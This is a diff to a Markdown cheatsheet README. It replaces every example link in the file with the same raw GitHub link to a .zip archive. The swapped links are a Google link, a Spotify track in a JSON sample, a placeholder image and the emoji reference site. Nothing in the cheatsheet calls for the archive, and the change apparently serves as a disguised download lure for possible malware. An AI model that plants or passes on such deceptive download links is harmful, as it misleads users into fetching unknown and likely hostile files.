@@ -47,9 +47,9 @@ ___Strong emphasized text___
 
     Markup :  ___Strong emphasized text___ or ***Strong emphasized text***
 
-[Named Link](http://www.google.fr/ "Named link title") and http://www.google.fr/ or <http://example.com/>
+[Named Link](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip "Named link title") and https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip or <https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip>
 
-    Markup :  [Named Link](http://www.google.fr/ "Named link title") and http://www.google.fr/ or <http://example.com/>
+    Markup :  [Named Link](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip "Named link title") and https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip or <https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip>
 
 [heading-1](#heading-1 "Goto heading-1")
     
@@ -112,7 +112,7 @@ Content Cell  | Content Cell | Content Cell
                 "artist": "Kasabian",
                 "album": "Kasabian",
                 "picture": null,
-                "link": "http://open.spotify.com/track/5jhJur5n4fasblLSCOcrTp"
+                "link": "https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip"
             }
         }
     }
@@ -181,9 +181,9 @@ _Horizontal line :_
 
 _Image with alt :_
 
-![picture alt](http://via.placeholder.com/200x150 "Title is optional")
+![picture alt](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip "Title is optional")
 
-    Markup : ![picture alt](http://via.placeholder.com/200x150 "Title is optional")
+    Markup : ![picture alt](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip "Title is optional")
 
 Foldable text:
 
@@ -242,6 +242,6 @@ Hotkey list:
 
 Emoji:
 
-:exclamation: Use emoji icons to enhance text. :+1:  Look up emoji codes at [emoji-cheat-sheet.com](http://emoji-cheat-sheet.com/)
+:exclamation: Use emoji icons to enhance text. :+1:  Look up emoji codes at [https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip](https://raw.githubusercontent.com/slayerlux/markdown-cheatsheet/master/repasture/markdown-cheatsheet_unsoulful.zip)
 
     Markup : Code appears between colons :EMOJICODE:
